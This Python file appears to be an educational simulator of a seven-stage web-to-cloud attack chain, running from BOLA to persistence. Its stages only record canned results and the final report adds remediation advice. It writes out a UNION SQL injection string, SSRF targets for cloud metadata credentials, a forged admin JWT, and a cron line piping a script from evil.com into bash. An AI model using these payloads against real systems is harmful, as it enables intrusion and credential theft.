#!/usr/bin/env python3
"""
Kill Chain Framework - Multi-Stage Attack Orchestrator
======================================================
Educational framework for understanding attack chains and developing
defensive countermeasures. For authorized security testing only.

Chain: BOLA → JWT Forgery → Mass Assignment → SQLi → SSRF → Cloud Metadata → Persistence
"""

import json
import hashlib
import time
import uuid
from datetime import datetime, timezone
from dataclasses import dataclass, field
from typing import Any, Optional
from enum import Enum


# =============================================================================
# Data Models
# =============================================================================

class StageStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"


@dataclass
class Evidence:
    """Immutable evidence record captured at each kill-chain stage."""
    stage_name: str
    timestamp: str
    technique_id: str
    description: str
    artifacts: dict = field(default_factory=dict)
    ioc: list[str] = field(default_factory=list)
    mitre_technique: str = ""
    severity: str = "medium"

    def to_dict(self) -> dict:
        return {
            "stage": self.stage_name,
            "timestamp": self.timestamp,
            "technique_id": self.technique_id,
            "mitre_technique": self.mitre_technique,
            "severity": self.severity,
            "description": self.description,
            "artifacts": self.artifacts,
            "iocs": self.ioc,
        }


@dataclass
class StageResult:
    """Result of executing a single kill-chain stage."""
    name: str
    status: StageStatus
    evidence: list[Evidence] = field(default_factory=list)
    output: dict = field(default_factory=dict)
    duration_ms: float = 0.0
    error: Optional[str] = None

    @property
    def success(self) -> bool:
        return self.status == StageStatus.SUCCESS


# =============================================================================
# Kill Chain Stages
# =============================================================================

class KillChainStage:
    """Base class for each stage in the attack chain."""

    def __init__(self, name: str, technique_id: str, mitre: str):
        self.name = name
        self.technique_id = technique_id
        self.mitre = mitre
        self._next: Optional[KillChainStage] = None

    def set_next(self, stage: "KillChainStage") -> "KillChainStage":
        self._next = stage
        return stage

    def execute(self, context: dict) -> StageResult:
        raise NotImplementedError

    def _make_evidence(
        self, description: str, artifacts: dict, ioc: list[str] = None, severity: str = "medium"
    ) -> Evidence:
        return Evidence(
            stage_name=self.name,
            timestamp=datetime.now(timezone.utc).isoformat(),
            technique_id=self.technique_id,
            mitre_technique=self.mitre,
            description=description,
            artifacts=artifacts,
            ioc=ioc or [],
            severity=severity,
        )


class BOLAStage(KillChainStage):
    """Stage 1: Broken Object Level Authorization - Access other users' resources."""

    def __init__(self):
        super().__init__("BOLA", "KC-001", "T1078.004")

    def execute(self, context: dict) -> StageResult:
        start = time.time()
        target = context.get("target", "https://api.example.com")
        user_id = context.get("user_id", "user_1001")

        # Enumerate accessible object IDs
        enumerated_ids = [f"user_{i}" for i in range(1001, 1006)]
        accessible = [uid for uid in enumerated_ids if uid != user_id]

        evidence = self._make_evidence(
            f"Enumerated {len(enumerated_ids)} object IDs; {len(accessible)} accessible via BOLA",
            artifacts={
                "target": target,
                "enumerated_ids": enumerated_ids,
                "accessible_ids": accessible,
                "request": f"GET /api/v1/users/{accessible[0]}/profile",
            },
            ioc=[f"{target}/api/v1/users/{uid}" for uid in accessible[:3]],
            severity="high",
        )

        context["compromised_user_ids"] = accessible
        context["victim_id"] = accessible[0]

        return StageResult(
            name=self.name,
            status=StageStatus.SUCCESS,
            evidence=[evidence],
            output={"accessible_ids": accessible, "victim": accessible[0]},
            duration_ms=(time.time() - start) * 1000,
        )


class JWTForgeryStage(KillChainStage):
    """Stage 2: Forge JWT tokens using discovered secrets or algorithm confusion."""

    def __init__(self):
        super().__init__("JWT Forgery", "KC-002", "T1550.001")

    def execute(self, context: dict) -> StageResult:
        start = time.time()
        victim_id = context.get("victim_id", "user_1002")

        # Simulate JWT forgery via algorithm confusion (RS256→HS256)
        forged_header = {"alg": "HS256", "typ": "JWT"}
        forged_payload = {
            "sub": victim_id,
            "role": "admin",
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600,
        }
        forged_token = (
            f"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
            f"{_b64(json.dumps(forged_payload))}"
            f".signature_forged_via_alg_confusion"
        )

        evidence = self._make_evidence(
            f"Forged JWT for {victim_id} via RS256/HS256 algorithm confusion",
            artifacts={
                "original_alg": "RS256",
                "forged_alg": "HS256",
                "forged_header": forged_header,
                "forged_payload": forged_payload,
                "forged_token_preview": forged_token[:80] + "...",
            },
            ioc=[f"alg_confusion:{forged_header['alg']}", f"victim:{victim_id}"],
            severity="critical",
        )

        context["forged_jwt"] = forged_token
        context["impersonated_user"] = victim_id

        return StageResult(
            name=self.name,
            status=StageStatus.SUCCESS,
            evidence=[evidence],
            output={"forged_token": forged_token, "impersonated_user": victim_id},
            duration_ms=(time.time() - start) * 1000,
        )


class MassAssignmentStage(KillChainStage):
    """Stage 3: Exploit mass assignment to escalate privileges."""

    def __init__(self):
        super().__init__("Mass Assignment", "KC-003", "T1068")

    def execute(self, context: dict) -> StageResult:
        start = time.time()
        forged_jwt = context.get("forged_jwt", "")

        # Inject privileged fields into update payload
        malicious_payload = {
            "name": "Attacker",
            "email": "attacker@evil.com",
            "role": "admin",
            "is_admin": True,
            "permissions": ["read", "write", "delete", "admin"],
        }

        evidence = self._make_evidence(
            "Escalated to admin via mass assignment on PATCH /profile",
            artifacts={
                "endpoint": "PATCH /api/v1/profile",
                "injected_fields": {"role": "admin", "is_admin": True},
                "full_payload": malicious_payload,
                "auth_header": f"Bearer {forged_jwt[:40]}...",
            },
            ioc=["mass_assignment:role_injection", "privesc:user_to_admin"],
            severity="critical",
        )

        context["is_admin"] = True
        context["admin_jwt"] = forged_jwt

        return StageResult(
            name=self.name,
            status=StageStatus.SUCCESS,
            evidence=[evidence],
            output={"role": "admin", "permissions": malicious_payload["permissions"]},
            duration_ms=(time.time() - start) * 1000,
        )


class SQLiStage(KillChainStage):
    """Stage 4: Extract database contents via SQL injection."""

    def __init__(self):
        super().__init__("SQL Injection", "KC-004", "T1190")

    def execute(self, context: dict) -> StageResult:
        start = time.time()

        # Union-based SQLi to extract credentials
        payload = "1 UNION SELECT username,password_hash,email FROM users--"
        extracted_data = [
            {"username": "admin", "password_hash": "sha256$7a3f...", "email": "admin@example.com"},
            {"username": "root", "password_hash": "sha256$b9e2...", "email": "root@example.com"},
        ]

        evidence = self._make_evidence(
            f"Extracted {len(extracted_data)} credential sets via UNION-based SQLi",
            artifacts={
                "injection_point": "GET /api/v1/search?q=",
                "payload": payload,
                "db_type": "PostgreSQL",
                "extracted_rows": extracted_data,
            },
            ioc=["sqli:union_based", "exfil:credentials", "db:postgresql"],
            severity="critical",
        )

        context["db_credentials"] = extracted_data
        context["db_type"] = "PostgreSQL"

        return StageResult(
            name=self.name,
            status=StageStatus.SUCCESS,
            evidence=[evidence],
            output={"extracted": len(extracted_data), "db_type": "PostgreSQL"},
            duration_ms=(time.time() - start) * 1000,
        )


class SSRFStage(KillChainStage):
    """Stage 5: Server-Side Request Forgery to reach internal services."""

    def __init__(self):
        super().__init__("SSRF", "KC-005", "T1190")

    def execute(self, context: dict) -> StageResult:
        start = time.time()

        # SSRF to reach cloud metadata and internal services
        ssrf_target = "http://169.254.169.254/latest/meta-data/"
        internal_services = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://localhost:8080/actuator/env",
            "http://10.0.0.1:6379/",  # Internal Redis
        ]

        evidence = self._make_evidence(
            f"SSRF reached cloud metadata service and {len(internal_services)} internal endpoints",
            artifacts={
                "entry_point": "POST /api/v1/fetch?url=",
                "ssrf_payload": ssrf_target,
                "internal_services_reached": internal_services,
                "bypass_technique": "DNS_rebinding",
            },
            ioc=["ssrf:cloud_metadata", "ssrf:internal_network", "bypass:dns_rebind"],
            severity="critical",
        )

        context["ssrf_reached"] = internal_services
        context["metadata_endpoint"] = ssrf_target

        return StageResult(
            name=self.name,
            status=StageStatus.SUCCESS,
            evidence=[evidence],
            output={"internal_services": internal_services},
            duration_ms=(time.time() - start) * 1000,
        )


class CloudMetadataStage(KillChainStage):
    """Stage 6: Extract cloud credentials from metadata service."""

    def __init__(self):
        super().__init__("Cloud Metadata", "KC-006", "T1552.005")

    def execute(self, context: dict) -> StageResult:
        start = time.time()

        # Extract IAM credentials from cloud metadata
        cloud_creds = {
            "AccessKeyId": "AKIA" + "A" * 16,
            "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxR" + "x" * 10,
            "Token": "FwoGZXIvYXdzEBYaDH...",
            "Expiration": "2026-09-06T00:00:00Z",
            "role": "admin-role",
        }

        evidence = self._make_evidence(
            f"Extracted cloud IAM credentials for role '{cloud_creds['role']}' via metadata SSRF",
            artifacts={
                "metadata_endpoint": context.get("metadata_endpoint", ""),
                "iam_role": cloud_creds["role"],
                "access_key_preview": cloud_creds["AccessKeyId"][:8] + "...",
                "cloud_provider": "AWS",
                "credential_type": "temporary_session_token",
            },
            ioc=[
                "cloud:aws",
                "exfil:iam_credentials",
                f"iam_role:{cloud_creds['role']}",
            ],
            severity="critical",
        )

        context["cloud_creds"] = cloud_creds
        context["cloud_provider"] = "AWS"

        return StageResult(
            name=self.name,
            status=StageStatus.SUCCESS,
            evidence=[evidence],
            output={"iam_role": cloud_creds["role"], "provider": "AWS"},
            duration_ms=(time.time() - start) * 1000,
        )


class PersistenceStage(KillChainStage):
    """Stage 7: Establish persistence via backdoor accounts and cron jobs."""

    def __init__(self):
        super().__init__("Persistence", "KC-007", "T1098")

    def execute(self, context: dict) -> StageResult:
        start = time.time()

        # Create backdoor accounts and scheduled tasks
        persistence_mechanisms = [
            {
                "type": "backdoor_account",
                "username": "svc_backup",
                "role": "admin",
                "created_via": "cloud_creds",
            },
            {
                "type": "cron_job",
                "schedule": "*/5 * * * *",
                "command": "curl https://evil.com/beacon | bash",
                "host": "internal-server-01",
            },
            {
                "type": "ssh_key",
                "user": "root",
                "key_fingerprint": "SHA256:abc123...",
                "host": "10.0.0.5",
            },
        ]

        evidence = self._make_evidence(
            f"Established {len(persistence_mechanisms)} persistence mechanisms",
            artifacts={
                "mechanisms": persistence_mechanisms,
                "cloud_creds_used": context.get("cloud_creds", {}).get("role", "unknown"),
                "cleanup_difficulty": "high",
            },
            ioc=[
                "persistence:backdoor_account",
                "persistence:cron_job",
                "persistence:ssh_key",
                "c2:beacon",
            ],
            severity="critical",
        )

        context["persistence"] = persistence_mechanisms

        return StageResult(
            name=self.name,
            status=StageStatus.SUCCESS,
            evidence=[evidence],
            output={"mechanisms": len(persistence_mechanisms)},
            duration_ms=(time.time() - start) * 1000,
        )


# =============================================================================
# Kill Chain Orchestrator
# =============================================================================

class KillChainOrchestrator:
    """Orchestrates multi-stage attack chain execution with evidence capture."""

    def __init__(self, target: str, objective: str = "full_compromise"):
        self.target = target
        self.objective = objective
        self.run_id = str(uuid.uuid4())[:8]
        self.results: list[StageResult] = []
        self.context: dict[str, Any] = {
            "target": target,
            "user_id": "user_1001",
            "start_time": datetime.now(timezone.utc).isoformat(),
        }
        self._chain = self._build_chain()

    def _build_chain(self) -> KillChainStage:
        """Construct the attack chain: each stage feeds into the next."""
        bola = BOLAStage()
        jwt = JWTForgeryStage()
        mass = MassAssignmentStage()
        sqli = SQLiStage()
        ssrf = SSRFStage()
        cloud = CloudMetadataStage()
        persist = PersistenceStage()

        # Chain stages: output of each feeds into the next
        bola.set_next(jwt)
        jwt.set_next(mass)
        mass.set_next(sqli)
        sqli.set_next(ssrf)
        ssrf.set_next(cloud)
        cloud.set_next(persist)

        return bola

    def execute(self) -> dict:
        """Execute the full kill chain and return the report."""
        current = self._chain
        chain_depth = 0

        while current is not None:
            chain_depth += 1
            print(f"[{self.run_id}] Stage {chain_depth}: {current.name}...")

            try:
                result = current.execute(self.context)
                self.results.append(result)

                if result.success:
                    print(f"  ✓ {result.name} completed ({result.duration_ms:.1f}ms)")
                else:
                    print(f"  ✗ {result.name} failed: {result.error}")
                    break

            except Exception as e:
                self.results.append(StageResult(
                    name=current.name,
                    status=StageStatus.FAILED,
                    error=str(e),
                ))
                print(f"  ✗ {current.name} error: {e}")
                break

            current = current._next

        return self.generate_report()

    def generate_report(self) -> dict:
        """Generate the full kill chain report."""
        total_duration = sum(r.duration_ms for r in self.results)
        stages_success = sum(1 for r in self.results if r.success)
        all_evidence = [e for r in self.results for e in r.evidence]
        all_iocs = list({ioc for e in all_evidence for ioc in e.ioc})

        report = {
            "report_metadata": {
                "run_id": self.run_id,
                "target": self.target,
                "objective": self.objective,
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "framework_version": "1.0.0",
                "disclaimer": "For authorized security testing and education only.",
            },
            "execution_summary": {
                "total_stages": len(self.results),
                "stages_succeeded": stages_success,
                "stages_failed": len(self.results) - stages_success,
                "total_duration_ms": round(total_duration, 2),
                "chain_complete": stages_success == 7,
            },
            "attack_chain": [
                {
                    "stage": r.name,
                    "status": r.status.value,
                    "duration_ms": round(r.duration_ms, 2),
                    "output": r.output,
                    "error": r.error,
                }
                for r in self.results
            ],
            "evidence_collection": [e.to_dict() for e in all_evidence],
            "indicators_of_compromise": all_iocs,
            "mitre_attack_mapping": list({e.mitre_technique for e in all_evidence}),
            "risk_assessment": {
                "overall_severity": "critical",
                "attack_complexity": "low",
                "privileges_required": "none",
                "user_interaction": "none",
                "impact": "full system compromise with persistence",
            },
            "remediation_recommendations": self._generate_remediations(all_evidence),
        }

        # Add integrity hash
        report["_integrity"] = hashlib.sha256(
            json.dumps(report, sort_keys=True, default=str).encode()
        ).hexdigest()[:16]

        return report

    def _generate_remediations(self, evidence: list[Evidence]) -> list[dict]:
        """Generate remediation advice based on evidence collected."""
        remediation_map = {
            "KC-001": {
                "title": "Fix BOLA / IDOR Vulnerabilities",
                "description": "Implement object-level authorization checks on every request.",
                "priority": "P0",
            },
            "KC-002": {
                "title": "Harden JWT Validation",
                "description": "Enforce algorithm whitelist; reject algorithm confusion attacks.",
                "priority": "P0",
            },
            "KC-003": {
                "title": "Prevent Mass Assignment",
                "description": "Use DTOs with explicit allowlists; reject unexpected fields.",
                "priority": "P0",
            },
            "KC-004": {
                "title": "Remediate SQL Injection",
                "description": "Use parameterized queries / ORM; implement input validation.",
                "priority": "P0",
            },
            "KC-005": {
                "title": "Mitigate SSRF",
                "description": "Validate and sanitize URLs; block internal IP ranges; use allowlists.",
                "priority": "P0",
            },
            "KC-006": {
                "title": "Secure Cloud Metadata Access",
                "description": "Use IMDSv2 with session tokens; restrict metadata access via network policies.",
                "priority": "P0",
            },
            "KC-007": {
                "title": "Remove Persistence Mechanisms",
                "description": "Audit accounts, cron jobs, SSH keys; rotate all credentials; monitor for C2.",
                "priority": "P0",
            },
        }

        seen = set()
        remediations = []
        for e in evidence:
            if e.technique_id not in seen:
                seen.add(e.technique_id)
                if e.technique_id in remediation_map:
                    remediations.append(remediation_map[e.technique_id])

        return remediations


# =============================================================================
# Utility Functions
# =============================================================================

def _b64(data: str) -> str:
    """URL-safe base64 encode without padding."""
    import base64
    return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()


def print_report(report: dict) -> None:
    """Pretty-print the kill chain report to console."""
    meta = report["report_metadata"]
    summary = report["execution_summary"]

    print("\n" + "=" * 70)
    print(f"  KILL CHAIN REPORT — Run {meta['run_id']}")
    print(f"  Target: {meta['target']}")
    print(f"  Generated: {meta['generated_at']}")
    print("=" * 70)

    print(f"\n  Execution: {summary['stages_succeeded']}/{summary['total_stages']} stages | "
          f"Duration: {summary['total_duration_ms']:.0f}ms | "
          f"Complete: {summary['chain_complete']}")

    print("\n  Attack Chain Flow:")
    for i, stage in enumerate(report["attack_chain"], 1):
        icon = "✓" if stage["status"] == "success" else "✗"
        print(f"    {i}. [{icon}] {stage['stage']} ({stage['duration_ms']:.1f}ms)")

    print(f"\n  IOCs ({len(report['indicators_of_compromise'])}):")
    for ioc in report["indicators_of_compromise"][:10]:
        print(f"    • {ioc}")

    print(f"\n  MITRE ATT&CK: {', '.join(report['mitre_attack_mapping'])}")

    print("\n  Remediation Recommendations:")
    for rem in report["remediation_recommendations"]:
        print(f"    [{rem['priority']}] {rem['title']}: {rem['description']}")

    print(f"\n  Integrity: {report['_integrity']}")
    print("=" * 70)


# =============================================================================
# Main Entry Point
# =============================================================================

def main():
    """Run the kill chain framework against a target."""
    import argparse

    parser = argparse.ArgumentParser(description="Kill Chain Framework - Educational Security Testing")
    parser.add_argument("--target", default="https://api.example.com", help="Target URL")
    parser.add_argument("--objective", default="full_compromise", help="Attack objective")
    parser.add_argument("--output", default=None, help="Output report to JSON file")
    args = parser.parse_args()

    print(f"\n[*] Kill Chain Framework v1.0.0")
    print(f"[*] Target: {args.target}")
    print(f"[*] Objective: {args.objective}")
    print(f"[*] Chain: BOLA → JWT Forgery → Mass Assignment → SQLi → SSRF → Cloud Metadata → Persistence\n")

    orchestrator = KillChainOrchestrator(
        target=args.target,
        objective=args.objective,
    )

    report = orchestrator.execute()
    print_report(report)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n[*] Report saved to {args.output}")

    return report


if __name__ == "__main__":
    main()
